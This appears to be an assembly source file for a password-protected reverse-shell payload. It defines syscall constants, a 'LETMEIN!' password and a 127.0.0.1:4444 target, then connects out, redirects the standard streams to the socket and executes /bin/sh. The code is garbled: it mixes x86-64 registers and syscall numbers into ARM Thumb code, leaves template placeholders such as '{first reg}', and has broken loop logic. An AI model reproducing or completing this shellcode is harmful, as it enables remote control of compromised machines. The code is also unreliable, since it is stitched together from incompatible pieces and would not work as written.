; Syscall numbers (Intel)
syscalls.socket  equ 0x29
syscalls.connect equ 0x2a
syscalls.dup2    equ 0x21
syscalls.read    equ 0x00
syscalls.execve  equ 0x3b

; Constant definitions
ipv4    equ 0x02            ; AF_INET
ipv4.addressLen equ 0x10 
tcp     equ 0x01            ; SOCK_STREAM

; Standard streams
standardIO.in   equ 0x00
standardIO.out  equ 0x01
standardIO.err  equ 0x02

;:> echo -n '//bin/sh' | rev | xxd
;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
binshString     equ 0x68732f6e69622f2f

; Configs
config.password equ 0x4d54454c214e4945  ; MTEL!NIE > LETMEIN!

config.target   equ 0x100007f5c110002   ; tcp://127.0.0.1:4444
; This has nullbytes, so I replaced it with its complement
config.target.complement equ 0xfeffff80a3eefffe  ; neg(tcp://127.0.0.1:4444)

.section .text

.global _start

_start:
.ARM
add   r3, pc, #1    ; switch to thumb mode 
bx    r3

.THUMB

.socket
mov   r0, #2
mov   r1, #1
eor   r2, r2
mov   r7, #200
add   r7, #81         // r7 = 281 (socket) 
svc   #1              // r0 = resultant sockfd

mov   r4, r0          // save sockfd in r4 

.connect
adr   r1, struct        // pointer to address, port 
strb  r2, [r1, #1]    // write 0 for AF_INET 
mov   r2, #16
add   r7, #2          // r7 = 283 (connect) 
svc   #1

.dup2loop
mov   r7, #63         // r7 = 63 (dup2)
mov   r0, r4          // r4 is the saved sockfd 
mov r1, #2
svc #1
bmi execve
dec r1
b   dup2loop

; 3 - Read password from the client fd
.read_pass:
    mov r7, syscall.read
    mov {first reg}, r4    ;r4 = fd
    mov {second reg}, #0x04
    sub rsp, rdx
    mov rsi, rsp    ; rsi => buffer
    svc #1
    ; Check password
    mov rax, config.password
    mov rdi, rsi
    scasq
jne read_pass

.execve
adr   r0, binsh
sub   r2, r2
sub   r1, r1
strb  r2, [r0, #7]
mov   r7, #11       // r7 = 11 (execve) 
svc   #1